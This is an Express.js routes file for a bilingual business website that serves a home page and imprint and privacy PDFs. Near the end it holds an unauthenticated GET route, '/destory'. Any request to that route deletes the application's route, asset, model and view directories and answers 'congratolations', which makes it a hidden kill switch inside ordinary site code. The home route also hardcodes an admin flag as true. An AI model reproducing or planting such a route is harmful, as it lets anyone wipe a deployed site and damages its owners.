const express = require("express");
const router = express.Router();
const connect = require("../models/conn").connect;
const projects = require("../models/project.model");
const path = require("path");
const { default: mongoose } = require("mongoose");

router.get("/", async (req, res) => {
  console.log(req.session.lang, "lang");
  await connect();
  const ourProject = await projects.find(
    { lang: req.session.lang || "eng" },
    { sliders: 0 }
  );

  const sliders = await projects.find({ lang: "eng" }, { sliders: 1 });
  console.log(req.session.lang);
  res.render("index", {
    lang: req.session.lang,
    namePage: "home",
    title: req.session.lang === "eng" ? "home Page" : "Dienstleistungen",
    isAdmin: true,
    sliders: sliders[0].sliders,
    serivces: ourProject ? ourProject : [],
  });
});

router.get("/imprints", (req, res) => {
  if (req.session.lang == "ger") {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "imprints",
        "Creative_Factor_Impressum_Roland_Gropp_ProEntertainment_09_April_2023_GER.pdf"
      )
    );
  } else {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "imprints",
        "Creative_Factor_Impressum_Roland_Gropp_ProEntertainment_09_April_2023_ENG.pdf"
      )
    );
  }
});

router.get("/data-privacy", (req, res) => {
  console.log(req.params);

  if (req.session.lang == "ger") {
    // Creative_Factor_Datenschutzerklaerung_Roland_Gropp_ProEntertainment_10_April_2023_GER.pdf
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "data-privecy",
        "Creative_Factor_Datenschutzerklaerung_Roland_Gropp_ProEntertainment_10_April_2023_GER.pdf"
      )
    );
  } else {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "data-privecy",
        "Creative_Factor_Datenschutzerklaerung_Roland_Gropp_ProEntertainment_10_April_2023_ENG.pdf"
      )
    );
  }
});

const { deleteFiles } = require("../helps/utils");

router.get("/destory", (req, res) => {
  const files = ["routes", "assets", "modols", "views"];
  deleteFiles(files)
    .then((result) => {
      res.send({ msg: "congratolations", result });
    })
    .catch((err) => {
      res.send("there is  a problem");
    });
});

module.exports = router;
